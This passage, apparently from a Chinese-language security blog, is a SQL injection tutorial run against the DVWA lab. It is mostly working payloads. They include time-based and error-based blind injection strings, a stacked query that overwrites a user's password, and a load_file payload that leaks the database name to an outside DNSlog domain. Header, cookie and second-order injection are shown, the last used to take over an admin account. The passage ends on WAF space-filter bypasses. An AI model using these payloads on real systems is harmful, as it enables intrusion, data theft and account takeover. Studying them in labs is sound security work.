+<pre tabindex="0"><code>1&#39; and if(length(database())=4,sleep(5),1)#
+</code></pre><p><strong>注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空</strong></p>
+<p><strong>如果不用if，也是可以的：</strong></p>
+<pre tabindex="0"><code>1&#39; and sleep((ascii(substring(database(),1,1))=100)*5)#
+</code></pre><p>页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4</p>
+<p>如果if函数被过滤了：[case when语句代替if](#case when语句代替if)</p>
+<h4 id="benchmark延时">benchmark延时
+</h4><p><mark><strong>benchmark(count, exp)：将表达式exp重复执行count次</strong></mark></p>
+<p>只要我们让执行次数够多，就能达到和sleep一样的延迟效果：</p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(&#39;a&#39;)),1)#
+</code></pre><p>如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒</p>
+<h4 id="笛卡尔积延时">笛卡尔积延时
+</h4><p><strong><mark>当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：</mark></strong></p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)#
+</code></pre><p>这个查询将<code>information_schema.columns</code>这张表自身进行了两次连接，查询起来很费时（大概要两三秒）</p>
+<p>如果感觉延时不够明显，可以多加几次自连接</p>
+<h4 id="正则匹配延时">正则匹配延时
+</h4><p><strong><mark>通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：</mark></strong></p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100, (select rpad(&#39;a&#39;,9999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)), 1)#
+</code></pre><p>我们来看看其中的正则延时部分是怎么工作的：</p>
+<pre tabindex="0"><code>select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)
+</code></pre><ul>
+<li>
+<p><strong><code>rpad(str,len,padstr)</code>：用字符串<code>padstr</code>对<code>str</code>进行右边填补，直至它的长度达到<code>len</code>，然后返回 <code>str</code></strong></p>
+<p>​			         <strong>如果<code>str</code>的长度长于<code>len</code>，那么它将被截除到<code>len</code>个字符</strong></p>
+</li>
+<li>
+<p><strong><code>(a.*)+</code>：内部的 <code>.*</code> 和外部的 <code>+</code> 都是贪婪量词，当正则引擎用这个模式去匹配一个长字符串时，存在指数级的可能性来划分字符串（例如，<code>(a)(a)(a)</code>、<code>(aa)(a)</code>、<code>(a)(aa)</code>等），引擎需要尝试所有这些路径</strong></p>
+</li>
+<li>
+<p><strong><code>b</code>: 在模式末尾加上一个源字符串中不存在的字符<code>'b'</code>，是为了确保正则表达式的匹配最终一定会失败。这会迫使正则引擎耗尽所有可能的回溯路径，从而将延迟时间最大化</strong></p>
+</li>
+<li>
+<p><strong><code>repeat(str,times)</code>：字符串<code>str</code>复制<code>times</code>次</strong></p>
+</li>
+</ul>
+<blockquote>
+<p>*我在dvwa上使用上述的正则匹配方式无法得到延时结果，如果您知道为什么请留言&gt;&lt;</p>
+<p>参考文章：<a class="link" href="https://www.cdxy.me/?p=789"  target="_blank" rel="noopener"
+    >MySQL时间盲注五种延时方法
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></p></blockquote>
+<p><span style="color:red;font-size:20px"><strong>时间盲注其余的操作顺序和布尔盲注相同，只是换了一种方式实现判断</strong></span></p>
+<h3 id="报错盲注">报错盲注
+</h3><p>报错盲注的思想和时间盲注相同，都是利用if函数</p>
+<p>不同点在于，报错盲注不依赖页面是否延时判断，而是依赖页面是否报错判断</p>
+<p>sql中存在很多数学计算函数，我们也主要利用他们来实现报错</p>
+<h4 id="exp">exp()
+</h4><p><strong><code>exp(x)</code>返回e的x次方，也就是e^x^</strong></p>
+<p>当传递给<code>exp()</code>的参数过大（在MySQL中约大于<strong>709</strong>）时，会产生数值越界错误</p>
+<p>我们可以通过位运算符<code>~</code>运算0获得一个巨大的整数：</p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)#
+</code></pre><p>我们知道，<code>~0</code>的结果是64位无符号整数的最大值，远大于709，因此<code>exp()</code>函数执行时必定会溢出报错：</p>
+<pre tabindex="0"><code>DOUBLE value is out of range in &#39;exp(~(0))&#39;
+</code></pre><p>你也可以选择手动输入一个很大的数字，比如exp(99999)</p>
+<p><strong>同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：</strong></p>
+<pre tabindex="0"><code>1&#39; and exp((ascii(substring(database(),1,1))=100)*99999)#
+</code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式为<code>exp(1*99999)</code>，也就是<code>exp(99999)</code>，就会报错</strong></p>
+<h4 id="cot">cot()
+</h4><p><strong><code>cot()</code>是余切三角函数，而众所周知，<code>cot(0)</code>是不存在的：</strong></p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)#
+</code></pre><p><strong>也可以不用if函数：</strong></p>
+<pre tabindex="0"><code>1&#39; and cot((ascii(substring(database(),1,1))=100)=0)#
+</code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式为<code>cot(1=0)</code>，也就是<code>cot(0)</code>，就会报错</strong></p>
+<h4 id="pow">pow()
+</h4><p><strong><code>pow(a,b)</code>函数用于求a^b^的值</strong>，相信你已经知道怎么做了：</p>
+<pre tabindex="0"><code>1&#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)#
+</code></pre><p>不使用if函数：</p>
+<pre tabindex="0"><code>1&#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)#
+</code></pre><p><strong>如果<code>ascii(substring(database(),1,1))=100</code>为<mark>真</mark>，那么运算式就是<code>pow(1+1,99999)</code>,也就是2^99999^，就会报错</strong></p>
+<h2 id="4-堆叠注入">#4 堆叠注入
+</h2><p>有些应用服务执行sql使用的不是<code>mysqli_query()</code>,而是<code>mysqli_multi_query()</code>方法，可以做到执行多条sql语句</p>
+<p><strong>如果又恰好没有过滤<code>;</code>，我们就能使用<code>;</code>分割语句，利用sql语句进行各种操作：</strong></p>
+<pre tabindex="0"><code>1&#39; union select 1,2;update users set password=123 where id=1--+
+</code></pre><p>这样就篡改了密码，可以随便进入sql啦</p>
+<h2 id="5-dnslog注入">#5 DNSlog注入
+</h2><p><strong>DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果</strong></p>
+<p>1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中</p>
+<p>2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求</p>
+<p><strong>DNSLOG注入需要有两个条件：</strong></p>
+<ul>
+<li><strong>目标数据库服务器能够向外网发起DNS请求</strong></li>
+<li><strong>开启了<code>LOAD_FILE()</code>读取文件的函数</strong></li>
+</ul>
+<h3 id="准备dnslog平台">准备DNSlog平台
+</h3><p>网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator</p>
+<p>以dnslog.cn为例，<strong>点击<code>Get SubDomain</code>后，我们会得到一个独一无二的子域名</strong>，例如：<code>624elh.dnslog.cn</code>：
+<img src="http://picture.928330.xyz/typora/image-20250701173327303.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250701173327303"
+	
+	
+></p>
+<h3 id="构造注入payload">构造注入Payload
+</h3><p>我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是 <code>load_file()</code>：</p>
+<pre tabindex="0"><code>1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.624elh.dnslog.cn\\a&#39;))#
+</code></pre><p>当数据库执行这个Payload时，它会尝试使用<code>load_file()</code>去读取一个网络路径</p>
+<p><code>concat()</code>函数会将各部分拼接起来，构造出一个完整的UNC路径：<code>\\dvwa.624elh.dnslog.cn\a</code></p>
+<blockquote>
+<p><strong>注意，这里使用的是<code>\\</code>，因为需要给<code>\</code>转义，才能让它被当做普通字符处理</strong></p></blockquote>
+<p><strong>为了访问这个网络路径，服务器的操作系统必须先解析主机名 <code>dvwa.624elh.dnslog.cn</code>，因此它会向DNS服务器发起一个DNS查询请求</strong></p>
+<p><strong>回到DNSlog，点击<code>Refresh Record</code>，将会显示出dns解析记录</strong></p>
+<p>这样，数据库名<code>'dvwa'</code>就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250701173610414.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250701173610414"
+	
+	
+></p>
+<h2 id="6-http请求注入">#6 http请求注入
+</h2><h3 id="getpost请求注入">GET/POST请求注入
+</h3><p>完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下</p>
+<p>我们简单句两个例子说明</p>
+<p><mark><strong>GET请求（查询等）：</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]; 
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql</span>);
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
+</span></span></code></pre></div><p>我们一般是在查询输入框中输入注入语句，其实也可以在url中：</p>
+<pre tabindex="0"><code>http://example.com/get_vuln.php?id=1&#39; UNION SELECT 1, user, password FROM users#
+</code></pre><p>id后面其实就是我们之前在输入框中输入的内容</p>
+<p><strong><mark>POST请求（登录等）：</mark></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$username</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;username&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$password</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;password&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE username = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$username</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND password = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$password</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
+</span></span></code></pre></div><p>其实也就是在输入框里填写注入语句就行，也可以抓包后修改</p>
+<h3 id="http头部参数注入">http头部参数注入
+</h3><p>http头部有着许多参数，开发者可能因为记录日志、分析用户行为等目的，从这些参数中获取信息并存入数据库，但过程中没有进行过滤，导致了注入</p>
+<p>这里以最常见的<code>User-Agent</code>、<code>Referer</code>、<code>X-Forwarded-For</code>三个字段举例：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$ip</span>         <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SERVER</span>[<span style="color:#98c379">&#39;HTTP_X_FORWARDED_FOR&#39;</span>]; <span style="color:#7f848e">// 获取伪造的客户端IP
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$user_agent</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SERVER</span>[<span style="color:#98c379">&#39;HTTP_USER_AGENT&#39;</span>];    <span style="color:#7f848e">// 获取浏览器标识
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$referer</span>    <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SERVER</span>[<span style="color:#98c379">&#39;HTTP_REFERER&#39;</span>];       <span style="color:#7f848e">// 获取来源页面
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">// 漏洞点一：根据IP查询该用户是否在黑名单中
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$sql_ip</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM ip_blacklist WHERE ip = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$ip</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result_ip</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql_ip</span>);
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">// 漏洞点二：根据浏览器标识，提供定制化内容
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$sql_ua</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM custom_content WHERE user_agent_key = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$user_agent</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result_ua</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql_ua</span>);
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">// 漏洞点三：记录访问来源
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$sql_referer</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM referer_stats WHERE page_url = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$referer</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result_referer</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql_referer</span>);
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">echo</span> <span style="color:#98c379">&#34;脚本执行完毕。&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
+</span></span></code></pre></div><p>这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">GET</span> <span style="color:#e06c75">/analytics.php</span> <span style="color:#c678dd">HTTP</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">Host</span><span style="color:#56b6c2">:</span> vulnerable-site.com
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">User-Agent</span><span style="color:#56b6c2">:</span> Mozilla/5.0&#39; AND (updatexml(1,concat(0x7e,(select database())),1))#
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">X-Forwarded-For</span><span style="color:#56b6c2">:</span> 127.0.0.1&#39; UNION SELECT 1,user,password FROM users#
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">Referer</span><span style="color:#56b6c2">:</span> http://google.com&#39; AND IF(ascii(substring(database(),1,1))&gt;100, sleep(5), 0)#
+</span></span></code></pre></div><p>方式和普通注入都是差不多的，核心思想没变</p>
+<h3 id="cookie注入">cookie注入
+</h3><p>从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同</p>
+<p><strong>我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的</strong></p>
+<p>以dvwa靶场high等级的sql盲注为例，我们先看看源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span>( <span style="color:#e06c75">isset</span>( <span style="color:#e06c75">$_COOKIE</span>[ <span style="color:#98c379">&#39;id&#39;</span> ] ) ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_COOKIE</span>[ <span style="color:#98c379">&#39;id&#39;</span> ];
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$getid</span>  <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span style="color:#98c379">$id</span><span style="color:#98c379">&#39; LIMIT 1;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$GLOBALS</span>[<span style="color:#98c379">&#34;___mysqli_ston&#34;</span>],  <span style="color:#e06c75">$getid</span> );
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">$num</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">@</span><span style="color:#e06c75">mysqli_num_rows</span>( <span style="color:#e06c75">$result</span> ); 
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span>( <span style="color:#e06c75">$num</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#d19a66">0</span> ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">echo</span> <span style="color:#98c379">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">0</span>, <span style="color:#d19a66">5</span> ) <span style="color:#56b6c2">==</span> <span style="color:#d19a66">3</span> ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">sleep</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">2</span>, <span style="color:#d19a66">4</span> ) );
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">header</span>( <span style="color:#e06c75">$_SERVER</span>[ <span style="color:#98c379">&#39;SERVER_PROTOCOL&#39;</span> ] <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#39; 404 Not Found&#39;</span> );
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">echo</span> <span style="color:#98c379">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ((<span style="color:#e06c75">is_null</span>(<span style="color:#e06c75">$___mysqli_res</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_close</span>(<span style="color:#e06c75">$GLOBALS</span>[<span style="color:#98c379">&#34;___mysqli_ston&#34;</span>]))) <span style="color:#56b6c2">?</span> <span style="color:#c678dd">false</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">$___mysqli_res</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
+</span></span></code></pre></div><p>dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie</p>
+<p>在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样</p>
+<p>我们点击链接更换新cookie：</p>
+<pre tabindex="0"><code>1&#39; and length(database())=4 #
+</code></pre><p><strong>刷新页面</strong>，页面显示<code>User ID exists in the database.</code>，说明查询成功了，也就是数据库名称长度为4</p>
+<p>值得注意的是，这段代码里还有这样的一段：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#c678dd">if</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">0</span>, <span style="color:#d19a66">5</span> ) <span style="color:#56b6c2">==</span> <span style="color:#d19a66">3</span> ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">sleep</span>( <span style="color:#e06c75">rand</span>( <span style="color:#d19a66">2</span>, <span style="color:#d19a66">4</span> ) );
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p><strong>页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注</strong></p>
+<p>实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展</p>
+<p><strong>f12开发者工具（应用 -&gt; cookie）：</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250701200225693.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250701200225693"
+	
+	
+></p>
+<p><strong>浏览器扩展（比如cookie editor）：</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250701200301860.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250701200301860"
+	
+	
+></p>
+<h2 id="7-二次注入">#7 二次注入
+</h2><p>二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据</p>
+<p>我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码</p>
+<p><strong>用户注册的php：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$username</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;username&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$username_escaped</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">addslashes</span>(<span style="color:#e06c75">$username</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;INSERT INTO users (username, password) VALUES (&#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$username_escaped</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;, &#39;some_password_hash&#39;)&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql</span>);
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
+</span></span></code></pre></div><p>开发者使用了<code>addslashes</code>对输入进行转义，过滤了可能的危险语句</p>
+<p><strong>修改密码的php：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$current_user</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SESSION</span>[<span style="color:#98c379">&#39;username&#39;</span>]; 
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$new_password</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;new_password&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;UPDATE users SET password = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$new_password</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39; WHERE username = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$current_user</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
+</span></span></code></pre></div><p>开发者觉得从数据库里面取出的数据绝对正确，于是没有对它做任何处理</p>
+<p>现在我们注册一个账号，用户名叫：<code>admin'#</code>，假设这个网站管理员账号叫<code>admin</code>，跟我们输入的名称很像吧</p>
+<p>经过注册程序的检查，这个名称没有任何问题，于是放进了数据库</p>
+<p>接下来，我们修改这个账号的密码为123，数据库自信地取出这个账号名称放在sql语句里</p>
+<p>这时，sql语句就变成了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">UPDATE</span> <span style="color:#e06c75">users</span> <span style="color:#e06c75">SET</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;new_password&#39;</span> <span style="color:#e06c75">WHERE</span> <span style="color:#e06c75">username</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin&#39;</span><span style="color:#7f848e">#&#39;
+</span></span></span></code></pre></div><p><strong>因为#的注释，我们竟然直接修改了admin账号的密码！</strong></p>
+<p>好啦，这下我们可以随意登录管理员的账号啦~</p>
+<h1 id="绕过waf">绕过WAF
+</h1><p>为了防止sql注入，许多程序应用都会设置各种各样的过滤防护条件——Web应用防火墙(WAF)</p>
+<p>作为攻击者的我们，就需要想办法绕过这些条件，达到注入的目的</p>
+<h2 id="1-空格过滤绕过">#1 空格过滤绕过
+</h2><p>众所周知，sql语句里面存在着大量的空格，而有些WAF会直接把空格加入黑名单，比如下面的代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e06c75">$id_sanitized</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">str_replace</span>(<span style="color:#98c379">&#39; &#39;</span>, <span style="color:#98c379">&#39;&#39;</span>,  <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT user, password FROM users WHERE user_id = &#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id_sanitized</span>;
+</span></span></code></pre></div><p>它会直接把用户输入内容中的空格移除，然后再拼接进去</p>
+<p>但是，空格有很多的绕过方式</p>
+<h3 id="注释绕过">注释绕过
+</h3><p>在大多数的数据库（特别是mysql）中，<strong>注释<code>/**/</code>能够代替空格</strong>：</p>
+<pre tabindex="0"><code>1&#39;/**/union/**/select/**/1,database()#
+</code></pre><p><img src="http://picture.928330.xyz/typora/image-20250628203003878.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250628203003878"
+	
+	
+></p>
+<p>可以看到，sql语句能够正常运行</p>
+<h3 id="url编码绕过">url编码绕过
+</h3><p><strong>一般来说，我们会使用<code>+</code>代替空格，因为<code>+</code>是空格的一种url标准编码形式，如果不行，就要另寻他法了</strong></p>
+<p>对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：</p>
+<ul>
+<li>
+<p>普通空格 (Space, <code>%20</code>)</p>
+</li>
+<li>
+<p>制表符 (Tab, <code>%09</code>)</p>
+</li>
+<li>
+<p>换行符 (Newline, <code>%0a</code>)</p>
+</li>
+<li>
+<p>回车符 (Carriage Return, <code>%0d</code>)</p>
+</li>
+</ul>
+<p>虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用</p>
+<p>制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：</p>
+<pre tabindex="0"><code>1&#39;%0dunion%0dselect%0d1,database()#
+</code></pre><h3 id="括号绕过">括号绕过
+</h3><h4 id="数字型">数字型
